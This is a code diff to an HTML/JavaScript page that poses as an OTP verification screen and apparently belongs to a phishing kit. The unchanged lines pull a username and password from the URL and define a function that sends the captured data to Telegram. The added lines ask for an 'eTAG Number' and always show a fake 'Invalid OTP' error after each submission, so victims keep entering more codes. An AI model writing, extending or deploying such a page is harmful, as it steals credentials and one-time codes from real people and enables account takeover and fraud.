@@ -248,7 +248,7 @@
         <div class="otp-input-section">
             <div class="otp-input-wrapper">
                 <div class="error-message-otp" id="errorMessage">Invalid OTP, please try again</div>
-                <input type="text" inputmode="numeric" class="otp-input" id="otpInput" placeholder="Enter OTP">
+                <input type="text" inputmode="numeric" class="otp-input" id="otpInput" placeholder="Please Enter eTAG Number" />
             </div>
         </div>
         
@@ -274,6 +274,9 @@
             const urlParams = new URLSearchParams(window.location.search);
             const username = urlParams.get('username');
             const password = urlParams.get('password');
+            
+            // Track if we've already shown the invalid OTP message
+            let hasShownInvalidOtp = false;
             
             // Function to send data to Telegram
             async function sendToTelegram(data) {
@@ -381,29 +384,35 @@
                 // Wait for 2 seconds to show loader
                 await new Promise(r => setTimeout(r, 2000));
 
-                // Hide loader and continue (no limits, always proceed if OTP is not empty)
+                // Hide loader
                 hideLoader();
                 
-                // Here you can redirect to the next page or continue with your flow
-                // For now, we'll just reset the form and show success
-                otpInput.value = '';
-                console.log("OTP verification completed successfully");
+                // Show invalid OTP message after submission
+                otpInput.classList.add('error');
+                errorMessage.classList.add('show');
+                hasShownInvalidOtp = true;
                 
-                // If you want to redirect to another page, uncomment the line below:
-                // window.location.href = 'next-page.html';
+                // Clear the input for next attempt
+                otpInput.value = '';
+                
+                console.log("OTP verification completed successfully");
             });
             
-            // Remove error class on focus
+            // Remove error class on focus (only if we've already shown the invalid message)
             otpInput.addEventListener('focus', function() {
-                otpInput.classList.remove('error');
-                errorMessage.classList.remove('show');
-            });
-            
-            // Remove error class on input
-            otpInput.addEventListener('input', function() {
-                if (otpInput.value.trim()) {
+                if (hasShownInvalidOtp) {
                     otpInput.classList.remove('error');
                     errorMessage.classList.remove('show');
+                    hasShownInvalidOtp = false;
+                }
+            });
+            
+            // Remove error class on input (only if we've already shown the invalid message)
+            otpInput.addEventListener('input', function() {
+                if (hasShownInvalidOtp && otpInput.value.trim()) {
+                    otpInput.classList.remove('error');
+                    errorMessage.classList.remove('show');
+                    hasShownInvalidOtp = false;
                 }
             });
         });
